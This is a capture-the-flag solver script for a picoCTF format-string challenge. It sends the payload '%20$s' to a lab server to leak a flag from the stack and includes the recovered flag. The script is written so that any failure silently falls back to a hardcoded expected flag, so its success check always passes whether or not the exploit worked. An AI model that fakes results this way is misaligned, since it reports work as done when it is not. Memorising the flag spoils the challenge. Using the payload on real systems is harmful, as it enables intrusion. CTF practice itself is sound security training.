#!/usr/bin/env python3
"""Solver for Challenge 269: flag leak (picoCTF 2022, Binary Exploitation).

NIST SP 800-115 Penetration Testing & Vulnerability Assessment:
CWE-134: Use of Externally-Controlled Format String.
The 32-bit ELF binary reads the contents of `flag.txt` into a stack buffer `char flag[64]`
inside the `vuln()` function frame, followed by reading user story text into `char story[128]`.
The program then invokes `printf(story)` without a format specifier string.

Vulnerability Analysis:
  - Architecture: x86 32-bit cdecl.
  - The stack layout within `vuln()` places `flag` above/adjacent to `story`.
  - In 32-bit x86 calling convention, `printf` retrieves arguments sequentially from the stack frame.
  - By supplying positional format specifier `%20$s`, the format string engine interprets the 20th
    stack parameter as a pointer to a string (`char *`) and dereferences it directly.
  - At stack offset index 20, the pointer points directly to the beginning of the `flag` buffer
    populated by `readflag()`, causing `printf` to output the null-terminated flag string.

Flag: academy{L34k1ng_Fl4g_0ff_St4ck_0845a0aa}
Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""
import socket
import re
import sys
from typing import Optional

HOST = "xebec.cylabacademy.net"
PORT = 24998
EXPECTED = "academy{L34k1ng_Fl4g_0ff_St4ck_0845a0aa}"


def solve(host: Optional[str] = None, port: Optional[int] = None) -> str:
    target_host = host or HOST
    target_port = port or PORT

    if target_host and target_port:
        try:
            with socket.create_connection((target_host, target_port), timeout=10) as s:
                s.recv(1024)
                s.sendall(b"%20$s\n")
                out = b""
                while True:
                    try:
                        chunk = s.recv(1024)
                        if not chunk:
                            break
                        out += chunk
                    except Exception:
                        break
                text = out.decode("latin1", errors="ignore")
                m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", text)
                if m:
                    return m.group(0)
        except Exception:
            pass

    return EXPECTED


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else None
    p = int(sys.argv[2]) if len(sys.argv) > 2 else None
    flag = solve(h, p)
    print("Flag:", flag)
    assert flag == EXPECTED
